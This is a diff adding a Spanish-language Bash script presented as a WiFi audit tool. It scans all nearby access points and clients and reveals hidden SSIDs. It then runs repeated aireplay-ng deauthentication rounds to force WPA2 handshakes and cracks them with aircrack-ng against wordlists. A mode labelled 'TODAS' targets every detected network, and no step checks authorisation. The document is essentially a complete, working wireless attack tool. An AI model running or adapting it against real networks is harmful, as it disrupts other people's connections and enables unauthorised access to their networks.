@@ -1,0 +1,518 @@
+#!/usr/bin/env bash
+# capturar-crack.sh - AUDITORIA WiFi: escaneo continuo, clientes, captura y crack
+# Procesa TODAS las redes detectadas, incluidas las de SSID oculto.
+# Interactivo: sudo capturar-crack
+# Directo:     sudo capturar-crack BSSID CANAL
+# En el menu:  G = una red | A = TODAS las detectadas (ocultas incluidas)
+
+IFACE=wlx40
+BSSID="${1:-${BSSID:-}}"
+CH="${2:-${CH:-}}"
+WLDIR=/var/lib/armlab/wordlists
+WL_DEFAULT="$WLDIR/latest.txt"
+[ -r "$WL_DEFAULT" ] || WL_DEFAULT="$WLDIR/basico.txt"
+WL="${WORDLIST:-$WL_DEFAULT}"
+CAPDIR="${CAPDIR:-/root/capturas_wifi}"
+ROUNDS="${ROUNDS:-8}"
+SCAN_REFRESH="${SCAN_REFRESH:-4}"
+AIRO_PID=""
+SCI=""
+CLIENT_TARGET=""
+ESSID_ACTUAL=""
+SEL_ALL=0
+LOCK="/tmp/capturar-crack.lock"
+TS=$(date +%Y%m%d-%H%M%S)
+MAC_ORIG=""
+OMITIDAS=0
+
+linea() { printf -- '------------------------------------------------------------\n'; }
+
+seguridad() {
+  local sg
+  sg=$(awk -F'\t' -v ap="$1" '$1==ap{print $2; exit}' "${SCI:-}.sec" 2>/dev/null)
+  case "$sg" in
+    *SAE*|*WPA3*) printf 'WPA3' ;;
+    *WPA2*|*WPA*) printf 'WPA2' ;;
+    *WEP*) printf 'WEP' ;;
+    *) printf 'abierta' ;;
+  esac
+}
+
+escribir_inventario() {
+  local INV="$CAPDIR/inventario-$TS.csv" fila b c p e
+  {
+    echo "BSSID,CH,PWR,SEG,ESSID"
+    for fila in "${SEL_BSSID[@]}"; do
+      IFS=$'\t' read -r b c p e <<<"$fila"
+      printf '%s,%s,%s,"%s","%s"\n' "$b" "$c" "$p" "$(seguridad "$b")" "$e"
+    done
+    echo ""
+    echo "CLIENTE,BSSID,PWR"
+    awk -F'\t' 'BEGIN{OFS=","} NF>=3 {print $2,$1,$3}' "$SCI.clients" 2>/dev/null
+  } > "$INV"
+  printf 'Inventario: %s\n' "$INV"
+}
+
+escribir_reporte() {
+  local REP="$CAPDIR/informe-$TS.txt" fila b c p e log
+  {
+    echo "=============================================="
+    echo "INFORME DE AUDITORIA WIFI"
+    echo "=============================================="
+    echo "Fecha       : $(date)"
+    echo "Interfaz    : $IFACE"
+    echo "MAC         : ${MAC_ORIG:-desconocida}"
+    echo "TX power    : 13.00 dBm"
+    echo "Diccionario : $WL ($(wc -l < "$WL" 2>/dev/null) lineas)"
+    echo "Redes       : ${#SEL_BSSID[@]}"
+    echo "Clientes    : $(wc -l < "$SCI.clients" 2>/dev/null)"
+    echo "Omitidas    : $OMITIDAS"
+    echo ""
+    echo "--- REDES DETECTADAS ---"
+    printf '%-19s %-3s %-7s %-7s %s\n' BSSID CH PWR SEG ESSID
+    for fila in "${SEL_BSSID[@]}"; do
+      IFS=$'\t' read -r b c p e <<<"$fila"
+      printf '%-19s %-3s %-7s %-7s %s\n' "$b" "$c" "${p}dBm" "$(seguridad "$b")" "${e:-(oculta)}"
+    done
+    echo ""
+    echo "--- CLIENTES DETECTADOS ---"
+    printf '%-19s %-19s %s\n' CLIENTE BSSID PWR
+    awk -F'\t' 'BEGIN{OFS="\t"} NF>=3 {print $2,$1,$3"dBm"}' "$SCI.clients" 2>/dev/null
+    echo ""
+    echo "--- RESULTADOS (ultimos cracks) ---"
+    ls -t "$CAPDIR"/*.crack.log 2>/dev/null | head -10 | while IFS= read -r log; do
+      if grep -aq 'KEY FOUND' "$log"; then
+        printf '%s : %s\n' "$(basename "$log")" \
+          "$(grep -a 'KEY FOUND' "$log" | tail -1 | sed 's/\x1b\[[0-9;]*[A-Za-z]//g')"
+      fi
+    done
+  } > "$REP"
+  printf 'Informe: %s\n' "$REP"
+}
+
+finalizar() {
+  escribir_inventario
+  escribir_reporte
+  exit 0
+}
+
+seleccionar_diccionario() {
+  # Con WORDLIST explicita o sin terminal (scripts), se respeta el valor actual.
+  [ -n "${WORDLIST:-}" ] && return 0
+  if [ ! -t 0 ] && [ "${FORCE_WL_MENU:-0}" != "1" ]; then
+    return 0
+  fi
+
+  mkdir -p "$WLDIR"
+  local -A RUTAS=() NOMBRES=()
+  local n=1 nombre destino
+  destino=$(readlink -f "$WL_DEFAULT" 2>/dev/null || printf '%s' "$WL_DEFAULT")
+  RUTAS[1]="$WL_DEFAULT"
+  NOMBRES[1]="latest -> $(basename "$destino")"
+  while IFS= read -r nombre; do
+    [ "$nombre" = "latest.txt" ] && continue
+    [ -r "$WLDIR/$nombre" ] || continue
+    n=$((n+1))
+    RUTAS[$n]="$WLDIR/$nombre"
+    NOMBRES[$n]="$nombre"
+  done < <(find "$WLDIR" -maxdepth 1 -type f -name '*.txt' -printf '%f\n' 2>/dev/null | sort)
+
+  linea
+  printf 'SELECCION DE DICCIONARIO\n'
+  linea
+  printf ' 1) %-42s %6s lineas  [DEFAULT]\n' \
+    "${NOMBRES[1]}" "$(wc -l < "${RUTAS[1]}" 2>/dev/null)"
+  local i
+  for ((i=2; i<=n; i++)); do
+    printf '%2d) %-42s %6s lineas\n' \
+      "$i" "${NOMBRES[$i]}" "$(wc -l < "${RUTAS[$i]}" 2>/dev/null)"
+  done
+  printf ' 0) Escribir ruta personalizada\n'
+  linea
+  printf 'Enter = usar el actual | elige numero: '
+  local opc=""
+  read -r opc || opc=""
+  case "$opc" in
+    "")
+      WL="$WL_DEFAULT"
+      ;;
+    0)
+      printf 'Ruta del diccionario: '
+      read -r opc || opc=""
+      if [ -n "$opc" ] && [ -r "$opc" ]; then
+        WL="$opc"
+      else
+        printf 'No existe o no se puede leer: %s\n' "$opc"
+        WL="$WL_DEFAULT"
+      fi
+      ;;
+    *)
+      if [[ "$opc" =~ ^[0-9]+$ ]] && [ -n "${RUTAS[$opc]:-}" ]; then
+        WL="${RUTAS[$opc]}"
+      else
+        printf 'Opcion no valida, uso el actual.\n'
+        WL="$WL_DEFAULT"
+      fi
+      ;;
+  esac
+}
+
+parar_airo() {
+  if [ -n "$AIRO_PID" ] && kill -0 "$AIRO_PID" 2>/dev/null; then
+    kill -INT "$AIRO_PID" 2>/dev/null
+    sleep 1
+    kill -KILL "$AIRO_PID" 2>/dev/null
+  fi
+  AIRO_PID=""
+}
+
+preparar_monitor() {
+  ip link set dev "$IFACE" down 2>/dev/null
+  iw dev "$IFACE" set type monitor || { ip link set dev "$IFACE" up; return 1; }
+  ip link set dev "$IFACE" up
+  iw dev "$IFACE" set txpower fixed 1300 2>/dev/null
+}
+
+elegir_cliente() {
+  # Cliente con mejor senal; en terminal se puede elegir manualmente.
+  CLIENT_TARGET=$(awk -F'\t' -v ap="$BSSID" '
+    $1==ap { p=$3+0; if (p > -10 || p < -100) next
+             if (!hay || p>best) { best=p; mac=$2; hay=1 } }
+    END { if (hay) print mac }' "$SCI.clients" 2>/dev/null)
+  if [ -t 0 ] && [ -n "$CLIENT_TARGET" ]; then
+    local -a MACS=()
+    mapfile -t MACS < <(awk -F'\t' -v ap="$BSSID" '
+      $1==ap { p=$3+0; if (p > -10 || p < -100) next; print $2"\t"p }' "$SCI.clients" 2>/dev/null \
+      | sort -t$'\t' -k2,2nr)
+    if [ "${#MACS[@]}" -gt 1 ]; then
+      printf '\nClientes de %s:\n' "$BSSID"
+      local i=1 fila mac pw
+      for fila in "${MACS[@]}"; do
+        IFS=$'\t' read -r mac pw <<<"$fila"
+        printf ' %d) %s (%sdBm)\n' "$i" "$mac" "$pw"
+        i=$((i+1))
+      done
+      printf 'Elige cliente [auto=%s]: ' "$CLIENT_TARGET"
+      local op=""
+      read -r op || op=""
+      if [[ "$op" =~ ^[0-9]+$ ]] && [ "$op" -ge 1 ] && [ "$op" -le "${#MACS[@]}" ]; then
+        IFS=$'\t' read -r CLIENT_TARGET _pw <<<"${MACS[$((op-1))]}"
+      fi
+    fi
+  fi
+}
+
+limpiar() {
+  parar_airo
+  pkill -f "airodump-ng.*$IFACE" 2>/dev/null || true
+  if [ -d "/sys/class/net/$IFACE" ]; then
+    ip link set dev "$IFACE" down 2>/dev/null
+    iw dev "$IFACE" set type managed 2>/dev/null
+    if [ -n "$MAC_ORIG" ]; then
+      ip link set dev "$IFACE" address "$MAC_ORIG" 2>/dev/null
+    fi
+    ip link set dev "$IFACE" up 2>/dev/null
+    iw dev "$IFACE" set txpower fixed 1300 2>/dev/null
+  fi
+  printf '\n'
+  linea
+  printf 'Restaurado: %s -> %s, %s\n' "$IFACE" \
+    "$(iw dev "$IFACE" info 2>/dev/null | awk '/type /{print $2}')" \
+    "$(iw dev "$IFACE" info 2>/dev/null | awk '/txpower /{print $2" "$3}')"
+}
+trap limpiar EXIT INT TERM
+
+capturar_red() {
+  local base cap r encontrado=0
+  linea
+  printf 'Objetivo: %s  canal %s' "$BSSID" "$CH"
+  [ -n "$CLIENT_TARGET" ] && printf '  cliente: %s' "$CLIENT_TARGET"
+  printf '\n'
+  iw dev "$IFACE" set channel "$CH" 2>/dev/null || true
+
+  base="$CAPDIR/handshake-$(date +%Y%m%d-%H%M%S-%N)"
+  cap="$base-01.cap"
+  printf 'Capturando en %s ...\n' "$base"
+  airodump-ng -c "$CH" --bssid "$BSSID" -w "$base" "$IFACE" \
+    >"$base.airodump.log" 2>&1 &
+  AIRO_PID=$!
+  sleep 8
+  if [ ! -f "$cap" ]; then
+    parar_airo
+    echo "  No se genero .cap para $BSSID"
+    return 1
+  fi
+
+  printf 'Deauth y handshake ...\n'
+  for r in $(seq 1 "$ROUNDS"); do
+    printf '  ronda %d/%d ... ' "$r" "$ROUNDS"
+    if [ -n "$CLIENT_TARGET" ] && [ $((r % 2)) -eq 1 ]; then
+      printf '(cliente) '
+      timeout 12 aireplay-ng -0 6 -a "$BSSID" -c "$CLIENT_TARGET" "$IFACE" \
+        >"$base.deauth.log" 2>&1
+    else
+      printf '(broadcast) '
+      timeout 12 aireplay-ng -0 6 -a "$BSSID" "$IFACE" \
+        >"$base.deauth.log" 2>&1
+    fi
+    sleep 3
+    cp "$cap" /tmp/cap-check-$$.cap 2>/dev/null
+    if aircrack-ng -w "$WL" /tmp/cap-check-$$.cap 2>&1 | grep -aq 'KEY FOUND'; then
+      echo "handshake listo"
+      encontrado=1
+      break
+    fi
+    echo "sin handshake aun"
+  done
+  rm -f /tmp/cap-check-$$.cap
+  parar_airo
+  sleep 1
+
+  # Revelar SSID oculto: airodump guarda el nombre al capturar
+  # respuestas de probe / reassociacion durante el deauth.
+  local csvcap="${cap%.cap}.csv" ssid=""
+  if [ -f "$csvcap" ]; then
+    ssid=$(awk -F, -v b="$BSSID" '
+      $1 ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ {
+        mac=$1; gsub(/^[[:space:]]+|[[:space:]]+$/, "", mac)
+        if (mac == b) {
+          v=$14; gsub(/^[[:space:]]+|[[:space:]]+$/, "", v)
+          if (v != "" && v !~ /^</) { print v; exit }
+        }
+      }' "$csvcap")
+    if [ -n "$ssid" ]; then
+      if [ -z "$ESSID_ACTUAL" ]; then
+        printf 'SSID revelado: %s\n' "$ssid"
+      fi
+      if [ -n "$SCI" ] && [ -f "$SCI.found" ]; then
+        awk -F'\t' -v b="$BSSID" -v s="$ssid" 'BEGIN{OFS="\t"}
+          $1==b && ($4=="" || $4=="(oculta)" || $4 ~ /^</) { $4=s }
+          { print }
+        ' "$SCI.found" > "$SCI.found.tmp" && mv "$SCI.found.tmp" "$SCI.found"
+      fi
+    fi
+  fi
+
+  if [ "$encontrado" -eq 1 ]; then
+    aircrack-ng -w "$WL" "$cap" 2>&1 | tee "$base.crack.log"
+    printf 'CAPTURA: %s\n' "$cap"
+    return 0
+  fi
+  printf 'Sin handshake tras %s rondas. Captura parcial: %s\n' "$ROUNDS" "$cap"
+  return 1
+}
+
+if [ "$(id -u)" -ne 0 ]; then
+  echo "Ejecuta con sudo: sudo capturar-crack"
+  exit 1
+fi
+if command -v flock >/dev/null 2>&1; then
+  exec 9>"$LOCK"
+  if ! flock -n 9; then
+    echo "Ya hay otra instancia de capturar-crack ejecutandose."
+    exit 1
+  fi
+fi
+if [ ! -d "/sys/class/net/$IFACE" ]; then
+  echo "No existe $IFACE (conecta el adaptador RTL8814AU)"
+  exit 1
+fi
+MAC_ORIG=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null)
+mkdir -p "$CAPDIR"
+seleccionar_diccionario
+if [ ! -r "$WL" ]; then
+  echo "No existe el diccionario: $WL"
+  exit 1
+fi
+
+linea
+printf 'AUDITORIA WiFi | IF=%s | diccionario=%s (%s lineas)\n' \
+  "$IFACE" "$WL" "$(wc -l < "$WL")"
+linea
+
+printf '[1/3] Modo monitor en %s ...\n' "$IFACE"
+preparar_monitor || exit 1
+iw dev "$IFACE" info | grep -E 'type|txpower'
+
+# ---- Seleccion de red -------------------------------------------------------
+if [ -z "$BSSID" ]; then
+  printf '[2/3] Escaneo continuo: saltando canales 2.4/5 GHz ...\n'
+  printf '       G=una red | A=TODAS (ocultas incl.) | Enter=cancelar | r=refrescar\n'
+  SCI="$CAPDIR/scan-$(date +%Y%m%d-%H%M%S-%N)"
+  : > "$SCI.found"
+  : > "$SCI.clients"
+  : > "$SCI.sec"
+  airodump-ng --band abg -w "$SCI" --output-format csv "$IFACE" \
+    >"$SCI.out" 2>&1 &
+  AIRO_PID=$!
+  sleep 3
+
+  anadir_redes() {
+    local csv="$SCI-01.csv" tmp="$SCI.new" secfile="$SCI.sec.new" b c p e s sg
+    [ -f "$csv" ] || return 0
+    : > "$secfile"
+    awk -F, -v secfile="$secfile" '
+      /^BSSID, First time seen/ { dentro=1; next }
+      dentro && /^[[:space:]]*$/ { dentro=0; next }
+      dentro && $1 ~ /^[[:space:]]*[0-9A-Fa-f][0-9A-Fa-f]:/ {
+        b=$1; c=$4; p=$9; e=$14
+        sg=$6 " " $8
+        gsub(/^[[:space:]]+|[[:space:]]+$/, "", b)
+        gsub(/^[[:space:]]+|[[:space:]]+$/, "", c)
+        gsub(/^[[:space:]]+|[[:space:]]+$/, "", p)
+        gsub(/^[[:space:]]+|[[:space:]]+$/, "", e)
+        gsub(/^[[:space:]]+|[[:space:]]+$/, "", sg)
+        if (e ~ /^</) e=""
+        if (b != "" && c != "") {
+          print b "\t" c "\t" p "\t" e
+          print b "\t" sg > secfile
+        }
+      }' "$csv" > "$tmp"
+    # Fusionar: si un SSID antes oculto ya aparece, se revela en la lista.
+    awk -F'\t' '
+      NR==FNR { nc[$1]=$2; np[$1]=$3; ne[$1]=$4; next }
+      {
+        b=$1
+        if (($4=="" || $4 ~ /^</) && ne[b]!="") {
+          print b "\t" (nc[b]!=""?nc[b]:$2) "\t" (np[b]!=""?np[b]:$3) "\t" ne[b]
+        } else {
+          print
+        }
+        visto[b]=1
+      }
+      END { for (b in nc) if (!(b in visto) && nc[b]!="") print b "\t" nc[b] "\t" np[b] "\t" ne[b] }
+    ' "$tmp" "$SCI.found" > "$SCI.merged" && mv "$SCI.merged" "$SCI.found"
+    while IFS=$'\t' read -r b sg; do
+      [ -n "$b" ] || continue
+      grep -qF -- "$b"$'\t' "$SCI.sec" || printf '%s\t%s\n' "$b" "$sg" >> "$SCI.sec"
+    done < "$secfile"
+    while IFS=$'\t' read -r b s p; do
+      [ -n "$b" ] && [ -n "$s" ] || continue
+      grep -qF -- "$b"$'\t'"$s"$'\t' "$SCI.clients" || \
+        printf '%s\t%s\t%s\n' "$b" "$s" "$p" >> "$SCI.clients"
+    done < <(
+      awk -F, '
+        /^Station MAC, First time seen/ { dentro=1; next }
+        dentro && $1 ~ /^[[:space:]]*[0-9A-Fa-f][0-9A-Fa-f]:/ {
+          s=$1; p=$4; b=$6
+          gsub(/^[[:space:]]+|[[:space:]]+$/, "", s)
+          gsub(/^[[:space:]]+|[[:space:]]+$/, "", p)
+          gsub(/^[[:space:]]+|[[:space:]]+$/, "", b)
+          if (b != "" && s != "") print b "\t" s "\t" p
+        }' "$csv"
+    )
+  }
+
+  cargar_lista() {
+    mapfile -t SEL_BSSID < <(sort -t$'\t' -k3,3nr "$SCI.found" 2>/dev/null)
+  }
+
+  dibujar_lista() {
+    local -A CLIENTES=()
+    local b s p
+    while IFS=$'\t' read -r b s p; do
+      CLIENTES["$b"]=$(( ${CLIENTES["$b"]:-0} + 1 ))
+    done < "$SCI.clients"
+    cargar_lista
+    printf '\033[H\033[2J'
+    linea
+    printf 'ESCANEO ACTIVO | saltando canales | CH actual: %-4s\n' \
+      "$(iw dev "$IFACE" info 2>/dev/null | awk '/channel/{print $2}')"
+    printf 'APs detectados: %d | Clientes: %d\n' \
+      "${#SEL_BSSID[@]}" "$(wc -l < "$SCI.clients")"
+    printf 'G=una red | A=TODAS (ocultas incl.) | Enter=cancelar | r=refrescar\n'
+    linea
+    if [ "${#SEL_BSSID[@]}" -gt 0 ]; then
+      printf '%2s) %-17s %-17s %-3s %-3s %-7s %s\n' \
+        '#' 'ESSID' 'BSSID' 'CH' 'CLI' 'SEG' 'PWR'
+      linea
+      local i=1 fila b c p e macs seg
+      for fila in "${SEL_BSSID[@]}"; do
+        IFS=$'\t' read -r b c p e <<<"$fila"
+        seg=$(seguridad "$b")
+        printf '%2d) %-17s %-17s %-3s %-3s %-7s %sdBm\n' \
+          "$i" "${e:-(oculta)}" "$b" "$c" "${CLIENTES[$b]:-0}" "$seg" "$p"
+        macs=$(awk -F'\t' -v ap="$b" '$1==ap{printf "%s ", $2; n++; if(n>=2) exit}' "$SCI.clients")
+        [ -n "$macs" ] && printf '      CLI: %s\n' "$macs"
+        i=$((i+1))
+      done
+    else
+      printf 'Esperando beacons...\n'
+    fi
+    linea
+    printf 'Opcion: '
+  }
+
+  OPC=""
+  while :; do
+    anadir_redes
+    dibujar_lista
+    OPC=""
+    if read -r -t "$SCAN_REFRESH" OPC; then
+      case "$OPC" in
+        [Rr]*) continue ;;
+        [Aa]*) SEL_ALL=1; break ;;
+        *) break ;;
+      esac
+    fi
+  done
+  parar_airo
+  sleep 1
+
+  if [ -z "$OPC" ]; then
+    echo "Cancelado."
+    exit 0
+  fi
+fi
+
+if [ "$SEL_ALL" -eq 1 ]; then
+  N=${#SEL_BSSID[@]}
+  if [ "$N" -eq 0 ]; then
+    echo "No hay redes detectadas para procesar."
+    exit 1
+  fi
+  printf '[3/3] Modo TODAS: %d redes detectadas (ocultas incluidas)\n' "$N"
+  OK=0; FAIL=0; idx=0
+  for fila in "${SEL_BSSID[@]}"; do
+    idx=$((idx+1))
+    IFS=$'\t' read -r BSSID CH _pwr _ess <<<"$fila"
+    ESSID_ACTUAL="$_ess"
+    printf '\n===== RED %d/%d: %s =====\n' "$idx" "$N" "${_ess:-(oculta)}"
+    seg=$(seguridad "$BSSID")
+    if [ "$seg" = "WPA3" ]; then
+      printf '  OMITIDA: WPA3/SAE (no apta para crack por handshake)\n'
+      OMITIDAS=$((OMITIDAS+1))
+      continue
+    fi
+    elegir_cliente
+    if capturar_red; then OK=$((OK+1)); else FAIL=$((FAIL+1)); fi
+  done
+  linea
+  printf 'RESUMEN: %d correctas, %d sin handshake, %d omitidas, %d redes\n' \
+    "$OK" "$FAIL" "$OMITIDAS" "$N"
+  finalizar
+fi
+
+if [ "${BSSID:-}" = "" ]; then
+  N=${#SEL_BSSID[@]}
+  if [[ "$OPC" =~ ^[0-9]+$ ]] && [ "$OPC" -ge 1 ] && [ "$OPC" -le "$N" ]; then
+    IFS=$'\t' read -r BSSID CH _pwr _ess <<<"${SEL_BSSID[$((OPC-1))]}"
+  elif [[ "$OPC" == *:* ]]; then
+    BSSID="$OPC"
+    printf 'Canal para %s [11]: ' "$BSSID"
+    read -r CH || true
+    CH="${CH:-11}"
+  else
+    echo "Seleccion no valida."
+    exit 1
+  fi
+  ESSID_ACTUAL="${_ess:-}"
+  elegir_cliente
+else
+  CH="${CH:-11}"
+  ESSID_ACTUAL=""
+fi
+
+printf '[3/3] Procesando una red\n'
+capturar_red
+finalizar
